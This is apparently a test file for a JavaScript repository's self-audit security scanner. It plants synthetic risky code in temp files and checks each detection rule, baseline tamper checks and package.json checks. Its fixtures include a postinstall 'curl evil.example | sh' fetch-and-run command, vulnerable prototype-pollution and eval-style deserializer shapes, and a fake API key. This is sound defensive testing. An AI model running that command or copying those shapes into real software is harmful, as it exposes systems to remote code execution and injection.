// selfAudit.test.mjs; upgrade 15 — validates the source-code self-audit
// scanner against REAL temp files (synthetic, deliberately planted
// patterns) for each detection rule, plus a real end-to-end run
// against THIS ACTUAL REPO to confirm zero unexplained false
// positives (the exact way the self-referential eval-in-selfAudit.js
// false positive was actually found and fixed while building this).

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { auditSourceTree, auditPackageJson, runSelfAudit, recordBaseline, checkAgainstBaseline } from '../src/lib/selfAudit.js';

function tempRepo(files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ciall-selfaudit-test-'));
  for (const [relPath, content] of Object.entries(files)) {
    const full = path.join(root, relPath);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content, 'utf8');
  }
  return root;
}

test('a clean file with none of the disclosed patterns produces zero findings', () => {
  const root = tempRepo({ 'src/clean.js': 'export function add(a, b) { return a + b; }\n' });
  const result = auditSourceTree(root);
  assert.equal(result.filesScanned, 1);
  assert.equal(result.clean, true);
  assert.deepEqual(result.findings, []);
});

test('real eval( usage in code is flagged high severity', () => {
  const root = tempRepo({ 'src/bad.js': 'export function run(s) { return eval(s); }\n' });
  const result = auditSourceTree(root);
  assert.equal(result.findings.length, 1);
  assert.equal(result.findings[0].code, 'eval-usage');
  assert.equal(result.findings[0].severity, 'high');
  assert.equal(result.findings[0].guardDetected, false);
});

// ---- guardDetected: a guard-shaped call nearby does NOT suppress the ---
// finding (this rule still cannot verify data flow) but IS annotated,
// for a human to deprioritize accordingly. Confirmed against a real
// case: serialize-to-js's real CWE-502 fix (GHSA-mm62-wxc8-cf7m) adds
// exactly `str = sanitize(str)` on the line before the unchanged
// `new Function('...' + str)` call -- this is that shape, verbatim.

test('guardDetected is true when a sanitizer-shaped call precedes new Function() in the same function', () => {
  const root = tempRepo({
    'src/deserialize.js': `
      function deserialize (str) {
        str = sanitize(str)
        return (new Function('return ' + str))()
      }
    `,
  });
  const result = auditSourceTree(root);
  const finding = result.findings.find((f) => f.code === 'function-constructor-usage');
  assert.equal(finding.guardDetected, true);
});

test('guardDetected is false when the SAME call has no guard at all -- the real pre-patch shape', () => {
  const root = tempRepo({
    'src/deserialize.js': `
      function deserialize (str) {
        return (new Function('return ' + str))()
      }
    `,
  });
  const result = auditSourceTree(root);
  const finding = result.findings.find((f) => f.code === 'function-constructor-usage');
  assert.equal(finding.guardDetected, false);
});

test('guardDetected does not look outside the enclosing top-level function -- a sanitizer call in an unrelated function elsewhere is not "nearby"', () => {
  const root = tempRepo({
    'src/deserialize.js': `
      function unrelated (x) { return sanitize(x); }
      function deserialize (str) {
        return (new Function('return ' + str))()
      }
    `,
  });
  const result = auditSourceTree(root);
  const finding = result.findings.find((f) => f.code === 'function-constructor-usage');
  assert.equal(finding.guardDetected, false);
});

test('eval( mentioned only in a comment is NOT flagged -- comment-stripping works', () => {
  const root = tempRepo({ 'src/ok.js': '// this file deliberately never calls eval(x) anywhere\nexport function run() { return 1; }\n' });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings, []);
});

test('new Function( usage is flagged high severity', () => {
  const root = tempRepo({ 'src/bad.js': 'const f = new Function("x", "return x+1");\n' });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'function-constructor-usage');
});

test('a long unreviewed base64-like blob is flagged medium severity', () => {
  const blob = 'A'.repeat(250);
  const root = tempRepo({ 'src/data.js': `export const PAYLOAD = "${blob}";\n` });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'unreviewed-base64-blob');
  assert.equal(result.findings[0].severity, 'medium');
});

test('a short base64-like string well under the 200-char threshold is NOT flagged', () => {
  const root = tempRepo({ 'src/data.js': `export const ID = "${'A'.repeat(20)}";\n` });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings, []);
});

test('an unreviewed child_process import is flagged high severity', () => {
  const root = tempRepo({ 'src/spawn.js': "import { execFile } from 'node:child_process';\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'unreviewed-child-process');
  assert.equal(result.findings[0].severity, 'high');
});

// ---- usesShellInterpolation: exec()/execSync() (shell-string, real ----
// injection risk) vs execFile()/spawn() (argv array, structurally
// immune) -- the actual shape of growl's real command-injection fix,
// GHSA-qh2h-chj9-jffq: `require('child_process').exec` became
// `require('child_process').spawn`, nothing else changed.

test('usesShellInterpolation is true when the shell-string exec()/execSync() API is used', () => {
  const root = tempRepo({ 'src/a.js': "var exec = require('child_process').exec;\nexec('echo ' + userInput);\n" });
  const result = auditSourceTree(root);
  const finding = result.findings.find((f) => f.code === 'unreviewed-child-process');
  assert.equal(finding.usesShellInterpolation, true);
});

test('usesShellInterpolation is false when only the argv-array spawn()/execFile() API is used -- the actually-safer half of the API', () => {
  const root = tempRepo({ 'src/a.js': "var spawn = require('child_process').spawn;\nspawn('echo', [userInput]);\n" });
  const result = auditSourceTree(root);
  const finding = result.findings.find((f) => f.code === 'unreviewed-child-process');
  assert.equal(finding.usesShellInterpolation, false);
});

test('an unreviewed low-level networking module import is flagged medium severity', () => {
  const root = tempRepo({ 'src/net.js': "import net from 'node:net';\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'unreviewed-network-module');
  assert.equal(result.findings[0].severity, 'medium');
});

test('a bare fetch( call outside the whitelist is flagged low severity', () => {
  const root = tempRepo({ 'src/net.js': "export async function go(url) { return fetch(url); }\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'unreviewed-fetch-call');
  assert.equal(result.findings[0].severity, 'low');
});

test('multiple distinct findings in one file are all reported, not just the first', () => {
  const root = tempRepo({ 'src/multi.js': "import { execFile } from 'node:child_process';\nconst x = eval('1+1');\n" });
  const result = auditSourceTree(root);
  const codes = result.findings.map((f) => f.code).sort();
  assert.deepEqual(codes, ['eval-usage', 'unreviewed-child-process']);
});

test('the scanner NEVER modifies, deletes, or touches any scanned file', () => {
  const root = tempRepo({ 'src/bad.js': 'eval("x")' });
  const before = fs.readFileSync(path.join(root, 'src/bad.js'), 'utf8');
  const beforeMtime = fs.statSync(path.join(root, 'src/bad.js')).mtimeMs;
  auditSourceTree(root);
  const after = fs.readFileSync(path.join(root, 'src/bad.js'), 'utf8');
  const afterMtime = fs.statSync(path.join(root, 'src/bad.js')).mtimeMs;
  assert.equal(after, before);
  assert.equal(afterMtime, beforeMtime);
});

test('excluded directories (node_modules, .git) are never scanned', () => {
  const root = tempRepo({
    'node_modules/pkg/index.js': 'eval("should never be seen")',
    'src/clean.js': 'export const x = 1;',
  });
  const result = auditSourceTree(root);
  assert.equal(result.filesScanned, 1);
  assert.deepEqual(result.findings, []);
});

// ---- upgrade 15: dynamic require/import, homoglyphs, prototype pollution -

test('a dynamic require( with a non-literal variable argument is flagged high severity', () => {
  const root = tempRepo({ 'src/loader.js': "const mod = 'fs'; const x = require(mod);\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'dynamic-require-or-import');
  assert.equal(result.findings[0].severity, 'high');
});

test('a dynamic import( with a non-literal argument is flagged', () => {
  const root = tempRepo({ 'src/loader.js': "const spec = decode(payload); const p = import(spec);\n" });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'dynamic-require-or-import'));
});

test('require(/import( with a literal string argument is NOT flagged', () => {
  const root = tempRepo({ 'src/loader.js': "import fs from 'node:fs';\nconst x = require('path');\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'dynamic-require-or-import'), []);
});

test('import( with a template-literal argument (this repo\'s own cache-busting pattern) is NOT flagged', () => {
  const root = tempRepo({ 'src/fresh.js': 'async function load(r) { return import(`./mod.js?fresh=${r}`); }\n' });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'dynamic-require-or-import'), []);
});

test('require(/import( mentioned only in a comment or a prose string is NOT flagged (the exact false positive found and fixed while building this)', () => {
  const root = tempRepo({ 'src/x.js': "// see the module-level import (not a fresh one) for details\nexport const x = 1;\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'dynamic-require-or-import'), []);
});

test('a homoglyph-shaped non-ASCII character in an identifier is flagged medium severity', () => {
  // U+0430 CYRILLIC SMALL LETTER A -- visually indistinguishable from
  // Latin "a" in most fonts, the real documented attack this targets.
  const root = tempRepo({ 'src/x.js': 'const аdmin = true;\nexport { аdmin };\n' });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'suspicious-non-ascii-character');
  assert.equal(result.findings[0].severity, 'medium');
});

test('this repo\'s own already-whitelisted prose symbols (em dash, math symbols) are NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': 'export const RATIO = 1; // upgrade 9 — computed as Σ over samples, converges to Δ ≈ 0\n' });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'suspicious-non-ascii-character'), []);
});

test('a non-ASCII character inside a comment is stripped before the check runs, same as every other rule', () => {
  const root = tempRepo({ 'src/x.js': '// café\nexport const x = 1;\n' });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'suspicious-non-ascii-character'), []);
});

test('a direct __proto__ assignment is flagged high severity', () => {
  const root = tempRepo({ 'src/x.js': "const obj = {};\nobj.__proto__ = { polluted: true };\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'prototype-mutation');
  assert.equal(result.findings[0].severity, 'high');
});

test('a direct Object.prototype mutation is flagged', () => {
  const root = tempRepo({ 'src/x.js': "Object.prototype.polluted = true;\n" });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'prototype-mutation'));
});

test('Object.setPrototypeOf is flagged', () => {
  const root = tempRepo({ 'src/x.js': "Object.setPrototypeOf(obj, null);\n" });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'prototype-mutation'));
});

test('a __proto__ EQUALITY COMPARISON is NOT flagged as pollution -- only a real assignment triggers this', () => {
  const root = tempRepo({ 'src/x.js': "if (name === '__proto__' || name.__proto__ === Object.prototype) throw new Error('rejected');\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'prototype-mutation'), []);
});

test('Object.prototype.hasOwnProperty.call (a safe, standard idiom) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "const has = Object.prototype.hasOwnProperty.call(obj, key);\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'prototype-mutation'), []);
});

test('__proto__ used as a plain object-literal key (not a real mutation) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "const obj = { __proto__: null, safe: true };\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'prototype-mutation'), []);
});

// ---- unguarded-dynamic-key-assignment: the actual shape of real ----------
// prototype-pollution CVEs (see bench/FINDINGS.md section 3), which the
// literal ".__proto__ =" pattern above cannot see at all.

test('minimist\'s REAL vulnerable setKey shape (a .forEach whose callback assigns through a computed property, no dangerous-key guard) is flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      function setKey (obj, keys, value) {
        var o = obj;
        keys.slice(0,-1).forEach(function (key) {
          if (o[key] === undefined) o[key] = {};
          o = o[key];
        });
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'unguarded-dynamic-key-assignment'), 'the real minimist CWE-1321 shape must be caught');
});

test('a for..in loop assigning through a computed property with no guard is flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      function merge (target, source) {
        for (var key in source) {
          target[key] = source[key];
        }
        return target;
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'unguarded-dynamic-key-assignment'));
});

test('the SAME shape with an explicit dangerous-key guard is NOT flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      function merge (target, source) {
        for (var key in source) {
          if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
          target[key] = source[key];
        }
        return target;
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'unguarded-dynamic-key-assignment'), []);
});

test('the SAME shape guarded by a blocklist array literal is NOT flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      var BLOCKED = ['__proto__', 'constructor', 'prototype'];
      function merge (target, source) {
        Object.keys(source).forEach(function (key) {
          if (BLOCKED.indexOf(key) !== -1) return;
          target[key] = source[key];
        });
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'unguarded-dynamic-key-assignment'), []);
});

test('a plain array iteration whose callback variable happens to be used as a computed property, with a fresh function-local object, is a KNOWN disclosed false-positive shape -- exercised directly, not silently special-cased', () => {
  // This is exactly why UNGUARDED_KEY_ASSIGNMENT_WHITELIST exists for
  // src/lib/dynamicsCheck.js and tests/mathExprBatch.test.mjs: the rule
  // cannot distinguish "iterating an object's own keys" from "iterating
  // an array of name strings." Demonstrated here on a throwaway fixture
  // (NOT whitelisted, so it DOES fire) to document the limitation
  // honestly rather than pretend the rule is precise.
  const root = tempRepo({
    'src/x.js': `
      function buildEnv (names, values) {
        var env = {};
        names.forEach(function (n, i) { env[n] = values[i]; });
        return env;
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'unguarded-dynamic-key-assignment'), 'documents the known false-positive shape rather than hiding it');
});

test('a computed READ (no assignment) through a loop variable is NOT flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      function hasAny (obj, keys) {
        return keys.some(function (key) { return obj[key] !== undefined; });
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'unguarded-dynamic-key-assignment'), []);
});

test('an unrelated .forEach with no computed-property assignment at all is NOT flagged', () => {
  const root = tempRepo({
    'src/x.js': `
      function sum (nums) {
        var total = 0;
        nums.forEach(function (n) { total += n; });
        return total;
      }
    `,
  });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'unguarded-dynamic-key-assignment'), []);
});

// ---- upgrade 15: SHA-256 baseline integrity -------------------------------

test('recordBaseline hashes every scanned file with a real SHA-256 digest', () => {
  const root = tempRepo({ 'src/a.js': 'export const x = 1;\n', 'src/b.js': 'export const y = 2;\n' });
  const baseline = recordBaseline(root);
  assert.equal(Object.keys(baseline.files).length, 2);
  assert.match(baseline.files['src/a.js'], /^[0-9a-f]{64}$/);
  assert.match(baseline.files['src/b.js'], /^[0-9a-f]{64}$/);
  assert.notEqual(baseline.files['src/a.js'], baseline.files['src/b.js']);
});

test('recordBaseline is deterministic: identical content produces identical hashes', () => {
  const rootA = tempRepo({ 'src/a.js': 'export const x = 1;\n' });
  const rootB = tempRepo({ 'src/a.js': 'export const x = 1;\n' });
  assert.equal(recordBaseline(rootA).files['src/a.js'], recordBaseline(rootB).files['src/a.js']);
});

test('checkAgainstBaseline reports clean when nothing has changed', () => {
  const root = tempRepo({ 'src/a.js': 'export const x = 1;\n' });
  const baseline = recordBaseline(root);
  const result = checkAgainstBaseline(root, baseline);
  assert.equal(result.clean, true);
  assert.deepEqual(result.added, []);
  assert.deepEqual(result.removed, []);
  assert.deepEqual(result.modified, []);
  assert.equal(result.unchanged, 1);
});

test('checkAgainstBaseline detects a REAL tamper: a file modified after the baseline was recorded', () => {
  const root = tempRepo({ 'src/a.js': 'export const x = 1;\n' });
  const baseline = recordBaseline(root);
  fs.writeFileSync(path.join(root, 'src/a.js'), 'export const x = 999; // tampered\n');
  const result = checkAgainstBaseline(root, baseline);
  assert.equal(result.clean, false);
  assert.deepEqual(result.modified, ['src/a.js']);
});

test('checkAgainstBaseline detects a new file added after the baseline', () => {
  const root = tempRepo({ 'src/a.js': 'export const x = 1;\n' });
  const baseline = recordBaseline(root);
  fs.writeFileSync(path.join(root, 'src/b.js'), 'export const y = 2;\n');
  const result = checkAgainstBaseline(root, baseline);
  assert.deepEqual(result.added, ['src/b.js']);
});

test('checkAgainstBaseline detects a file removed after the baseline', () => {
  const root = tempRepo({ 'src/a.js': 'export const x = 1;\n', 'src/b.js': 'export const y = 2;\n' });
  const baseline = recordBaseline(root);
  fs.rmSync(path.join(root, 'src/b.js'));
  const result = checkAgainstBaseline(root, baseline);
  assert.deepEqual(result.removed, ['src/b.js']);
});

test('checkAgainstBaseline rejects a malformed baseline object', () => {
  const root = tempRepo({ 'src/a.js': 'x' });
  assert.throws(() => checkAgainstBaseline(root, null), /needs a manifest object/);
  assert.throws(() => checkAgainstBaseline(root, {}), /needs a manifest object/);
});

// ---- post-upgrade-15: weak crypto, hardcoded credentials, disabled TLS ---

test('createHash("md5") and createHash("sha1") are flagged high severity', () => {
  const root = tempRepo({ 'src/x.js': "import crypto from 'node:crypto';\nconst h = crypto.createHash('md5').update('x').digest('hex');\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'weak-crypto-algorithm');
  assert.equal(result.findings[0].severity, 'high');
});

test('createHash("sha256") (a real, strong algorithm) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "import crypto from 'node:crypto';\nconst h = crypto.createHash('sha256').update('x').digest('hex');\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'weak-crypto-algorithm'), []);
});

test('the deprecated no-IV createCipher/createDecipher API is flagged', () => {
  const root = tempRepo({ 'src/x.js': "const c = crypto.createCipher('aes-256-cbc', key);\n" });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'weak-crypto-algorithm'));
});

test('createCipheriv with a legacy cipher (DES/RC4) is flagged; a modern one (AES-GCM) is NOT', () => {
  const weak = tempRepo({ 'src/x.js': "const c = crypto.createCipheriv('des-ede3-cbc', key, iv);\n" });
  assert.ok(auditSourceTree(weak).findings.some((f) => f.code === 'weak-crypto-algorithm'));
  const strong = tempRepo({ 'src/x.js': "const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n" });
  assert.deepEqual(auditSourceTree(strong).findings.filter((f) => f.code === 'weak-crypto-algorithm'), []);
});

test('a hardcoded API key/secret/password/token literal is flagged high severity', () => {
  const root = tempRepo({ 'src/x.js': "const apiKey = 'sk_live_51H8xJ2eZvKYlo2C';\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'hardcoded-credential');
  assert.equal(result.findings[0].severity, 'high');
});

test('a real key read from process.env (this repo\'s own standing pattern) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "const apiKey = process.env.ANTHROPIC_API_KEY;\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'hardcoded-credential'), []);
});

test('a short, clearly-placeholder credential value (under the 12-char threshold) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "const password = 'x';\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'hardcoded-credential'), []);
});

test('rejectUnauthorized:false outside the reviewed whitelist is flagged high severity', () => {
  const root = tempRepo({ 'src/x.js': "const opts = { rejectUnauthorized: false };\n" });
  const result = auditSourceTree(root);
  assert.equal(result.findings[0].code, 'tls-verification-disabled');
  assert.equal(result.findings[0].severity, 'high');
});

test('NODE_TLS_REJECT_UNAUTHORIZED is flagged', () => {
  const root = tempRepo({ 'src/x.js': "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n" });
  const result = auditSourceTree(root);
  assert.ok(result.findings.some((f) => f.code === 'tls-verification-disabled'));
});

test('rejectUnauthorized:true (verification correctly enabled) is NOT flagged', () => {
  const root = tempRepo({ 'src/x.js': "const opts = { rejectUnauthorized: true };\n" });
  const result = auditSourceTree(root);
  assert.deepEqual(result.findings.filter((f) => f.code === 'tls-verification-disabled'), []);
});

// ---- package.json checks -------------------------------------------------

test('auditPackageJson is clean for a zero-dependency package.json with no lifecycle scripts', () => {
  const root = tempRepo({ 'package.json': JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }) });
  const result = auditPackageJson(root);
  assert.equal(result.clean, true);
});

test('auditPackageJson flags any non-empty dependency field as a real supply-chain surface', () => {
  const root = tempRepo({ 'package.json': JSON.stringify({ name: 'x', dependencies: { leftpad: '1.0.0' } }) });
  const result = auditPackageJson(root);
  assert.equal(result.findings[0].code, 'unexpected-dependency');
  assert.equal(result.findings[0].severity, 'high');
});

test('auditPackageJson flags a postinstall lifecycle script -- the most common real npm attack vector', () => {
  const root = tempRepo({ 'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'curl evil.example | sh' } }) });
  const result = auditPackageJson(root);
  assert.equal(result.findings[0].code, 'lifecycle-script-present');
  assert.match(result.findings[0].detail, /postinstall/);
});

test('auditPackageJson handles a missing package.json without throwing', () => {
  const root = tempRepo({});
  const result = auditPackageJson(root);
  assert.equal(result.findings[0].code, 'no-package-json');
});

// ---- real end-to-end run against THIS actual repo ------------------------

test('runSelfAudit against the real repo produces only known, reviewed, benign findings -- zero unexplained ones', () => {
  const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
  const result = runSelfAudit(REPO_ROOT);

  assert.ok(result.filesScanned > 50, 'sanity: this repo has well over 50 source/test files');
  assert.equal(result.findings.some((f) => f.file === 'src/lib/selfAudit.js'), false, 'selfAudit.js must not flag itself (its own detection patterns necessarily contain the substrings they detect)');

  // Every real finding here is a KNOWN, already-reviewed case (see this
  // test's own comment for why each is expected), not an unreviewed
  // surprise -- confirmed by an explicit allowlist of exactly which
  // files/codes are permitted to appear, so a genuinely NEW finding
  // (a real new eval() call, a new dependency, an unexpected import in
  // a NEW file) still fails this test loudly.
  const knownBenign = new Set([
    'unreviewed-fetch-call:src/lib/connectors/connector.js', // DataSource contract's own fetch() method name, not a network call
    'unreviewed-fetch-call:src/lib/connectors/fileConnector.js',
    'unreviewed-fetch-call:src/lib/connectors/httpConnector.js',
    'unreviewed-base64-blob:tests/camera.test.mjs', // real test fixture image data, reviewed
    'unreviewed-base64-blob:tests/imageMetadata.test.mjs', // real test fixture image data, reviewed
    'unreviewed-fetch-call:tests/connectors.test.mjs', // test calls the real fetch API directly on purpose
    'unreviewed-fetch-call:tests/dashboardServer.test.mjs',
    'unreviewed-fetch-call:tests/dashboardServerInstances.test.mjs',
    'unreviewed-network-module:tests/http2Connection.test.mjs', // exercises the real TLS/HTTP2 stack directly, by design
    'unreviewed-network-module:tests/kernelService.test.mjs',
    'unreviewed-child-process:tests/kernelExport.test.mjs', // spawns the exported WASM harness in a real separate process, by design
    // This test file's OWN synthetic test fixtures literally contain the
    // planted strings 'eval(', 'new Function(', 'node:child_process',
    // 'node:net', and 'fetch(' as test content (to prove each detection
    // rule fires) -- self-referential in exactly the same way
    // src/lib/selfAudit.js's own detection code was, found and handled
    // the same way: expected, not a real usage, documented here rather
    // than silently excluded.
    'eval-usage:tests/selfAudit.test.mjs',
    'function-constructor-usage:tests/selfAudit.test.mjs',
    'unreviewed-child-process:tests/selfAudit.test.mjs',
    'unreviewed-network-module:tests/selfAudit.test.mjs',
    'unreviewed-fetch-call:tests/selfAudit.test.mjs',
    // offlineResilience.test.mjs (upgrade 15) deliberately POISONS
    // global.fetch and its own error message literally says "fetch()
    // was called" -- a real, expected self-reference, not a network call.
    'unreviewed-fetch-call:tests/offlineResilience.test.mjs',
    // This test file's OWN new synthetic fixtures for the three new
    // detection rules below (dynamic require/import, homoglyphs,
    // prototype pollution) are, again, self-referential in the same
    // way: planted test content, not real usage.
    'dynamic-require-or-import:tests/selfAudit.test.mjs',
    'suspicious-non-ascii-character:tests/selfAudit.test.mjs',
    'prototype-mutation:tests/selfAudit.test.mjs',
    // This file's own new unguarded-dynamic-key-assignment fixtures
    // (the real minimist setKey shape, a plain for..in merge, and the
    // deliberately-demonstrated array-iteration false-positive case)
    // are planted test content proving the rule fires/doesn't fire --
    // same self-referential category as every entry above.
    'unguarded-dynamic-key-assignment:tests/selfAudit.test.mjs',
    // Two genuinely real, reviewed non-ASCII test fixtures: real
    // Unicode/multi-byte test strings (café, ö, Japanese characters, an
    // emoji) exercising fixProtocol.js's ASCII-rejection path and
    // msgpack.js's multi-byte string encoding -- correctly flagged by
    // the new homoglyph-adjacent check, correctly benign on review.
    'suspicious-non-ascii-character:tests/fixProtocol.test.mjs',
    'suspicious-non-ascii-character:tests/msgpack.test.mjs',
    // Upgrade 17: atRestEncryption.test.mjs's real Unicode round-trip
    // test fixture ("héllo wörld 日本語 🎉"), same benign category as
    // the two above.
    'suspicious-non-ascii-character:tests/atRestEncryption.test.mjs',
    // Post-upgrade-15: this test file's own new synthetic fixtures for
    // the crypto/credential/TLS rules (a fake MD5 call, a fake API key
    // string, a fake rejectUnauthorized:false object) are, again,
    // self-referential planted test content.
    'weak-crypto-algorithm:tests/selfAudit.test.mjs',
    'hardcoded-credential:tests/selfAudit.test.mjs',
    'tls-verification-disabled:tests/selfAudit.test.mjs',
    // kernelService.test.mjs (upgrade 8) legitimately exercises the real
    // TLS client against a self-signed dev cert, same reviewed tradeoff
    // as kernelServiceClient.js itself, just exercised directly here.
    'tls-verification-disabled:tests/kernelService.test.mjs',
    // iterativeVerify.test.mjs proves scanForRedFlags/scanCodeText (the
    // extraction in selfAudit.js that lets iterativeVerify.js's
    // per-round red-flag gate run against arbitrary model-output text,
    // not just repo files) actually catches eval()/new Function() --
    // same self-referential planted-fixture category as this file's own
    // entries above, not a real usage.
    'eval-usage:tests/iterativeVerify.test.mjs',
    'function-constructor-usage:tests/iterativeVerify.test.mjs',
    // benchHarness.test.mjs's own test NAME describes CWE-502/CWE-95
    // coverage and literally says "new Function()" while doing so --
    // same self-referential category, not a real usage.
    'function-constructor-usage:tests/benchHarness.test.mjs',
    // shiftLeftScan.test.mjs's own synthetic fixtures plant a
    // child_process usage inside a temp-file string literal to prove
    // the shift-left chain wiring actually detects and composes it --
    // same self-referential planted-fixture category as every entry
    // above, not a real usage in this test file itself.
    'unreviewed-child-process:tests/shiftLeftScan.test.mjs',
    'unreviewed-fetch-call:tests/shiftLeftScan.test.mjs',
    'unguarded-dynamic-key-assignment:tests/shiftLeftScan.test.mjs',
    'hardcoded-credential:tests/shiftLeftScan.test.mjs',
  ]);
  for (const f of result.findings) {
    const key = `${f.code}:${f.file}`;
    assert.ok(knownBenign.has(key), `UNEXPECTED new finding, needs real review: ${key} — ${f.detail}`);
  }
});

test('runSelfAudit never rejects/throws for the real repo and always carries the honesty disclosure', () => {
  const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
  const result = runSelfAudit(REPO_ROOT);
  assert.match(result.honesty, /not a general malware\/trojan detector/);
  assert.match(result.honesty, /nothing here modifies, deletes, or quarantines any file/);
});
